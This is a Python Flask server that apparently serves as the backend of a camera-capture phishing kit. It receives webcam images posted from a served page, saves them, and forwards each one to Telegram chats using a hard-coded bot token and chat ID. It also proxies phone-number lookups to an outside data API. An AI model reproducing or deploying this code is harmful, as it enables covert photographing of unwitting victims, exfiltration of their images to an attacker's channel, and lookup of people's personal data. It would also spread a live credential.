from flask import Flask, request, jsonify, send_from_directory
import base64, re, os, requests

app = Flask(__name__)

SAVE_DIR = "captures"
os.makedirs(SAVE_DIR, exist_ok=True)

# Telegram config
BOT_TOKEN = "8332712176:AAF3Gip4RC3YLDvKJVXINvH3zGfOXC3_vt0"

# List of chat IDs for multi-send
CHAT_IDS = ["8167904992"]  # Add your chat IDs here

@app.route("/")
def index():
    return send_from_directory(".", "index.html")

# Camera upload endpoint
@app.route("/upload", methods=["POST"])
def upload():
    data = request.get_json()
    img_data = data.get("image", "")

    match = re.search(r"^data:image/png;base64,(.*)$", img_data)
    if not match:
        return jsonify({"status": "error", "msg": "invalid data"}), 400

    img_bytes = base64.b64decode(match.group(1))
    filename = os.path.join(SAVE_DIR, f"cap_{len(os.listdir(SAVE_DIR))}.png")
    with open(filename, "wb") as f:
        f.write(img_bytes)

    # Send to multiple Telegram chats
    for chat_id in CHAT_IDS:
        with open(filename, "rb") as f:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
            files = {"photo": f}
            data = {"chat_id": chat_id, "caption": "New capture received 📸"}
            requests.post(url, data=data, files=files)

    return jsonify({"status": "ok", "saved": filename, "sent_to": len(CHAT_IDS)})

# Proxy route for phone API to avoid CORS
@app.route("/api-proxy")
def api_proxy():
    phone = request.args.get("phone")
    if not phone:
        return jsonify({"error": "phone parameter missing"}), 400

    api_url = f"https://api.impossible-world.xyz/api/data?phone={phone}"
    try:
        resp = requests.get(api_url)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)